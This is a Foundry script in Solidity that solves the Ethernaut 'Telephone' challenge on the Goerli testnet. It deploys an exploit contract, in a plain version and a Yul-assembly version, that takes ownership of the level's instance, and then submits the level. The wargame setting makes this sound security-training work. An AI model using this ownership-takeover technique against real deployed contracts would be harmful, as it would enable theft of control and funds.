// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";
import { TelephoneExploit } from "../../contracts/4_Telephone.sol";

interface Instance {
    function owner() external view returns (address);

    function changeOwner(address _owner) external;
}

contract TelephoneScript is EthernautScript {
    string network = "goerli";
    address level = 0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        TelephoneExploit telephone = new TelephoneExploit(address(instance));
        require(instance.owner() != player);
        telephone.baseExploit(player);
        require(instance.owner() == player);
    }

    function yulVersion() internal {
        // i don't think there is a way to access the init code of a contract with Yul
        bytes memory creationCode = type(TelephoneExploit).creationCode;

        assembly {
            let contractSize := mload(creationCode)
            let contractOffset := add(creationCode, 0x20)
            let offsetConstructorArg := add(contractOffset, contractSize) // that's where we're going to write the contructor argument (`owner`)

            mstore(creationCode, add(contractSize, 0x20)) // we are going to add the `owner` argument, so we increase the size by 32 bytes
            mstore(offsetConstructorArg, sload(instance.slot)) // we concat the argument to the init bytecode

            let telephoneExploit := create(0, contractOffset, mload(creationCode))
            if iszero(telephoneExploit) {
                revert(0, 0)
            }

            function getOwner(_contract) -> _owner {
                mstore(0, "owner()")
                mstore(0, keccak256(0, 7))
                let success := staticcall(gas(), _contract, 0, 4, 0, 0x20)
                if iszero(success) {
                    revert(0, 0)
                }
                _owner := mload(0)
            }

            let owner := sload(player.slot)

            // before: we check that the `owner` is not already `player`
            if iszero(iszero(eq(getOwner(sload(instance.slot)), owner))) {
                revert(0, 0)
            }

            mstore(0, "yulExploit(address)")
            mstore(0, keccak256(0, 19))
            mstore(4, owner)
            let success := call(gas(), telephoneExploit, 0, 0, 0x24, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            // we make sure the `owner` is `player`
            if iszero(eq(getOwner(sload(instance.slot)), owner)) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
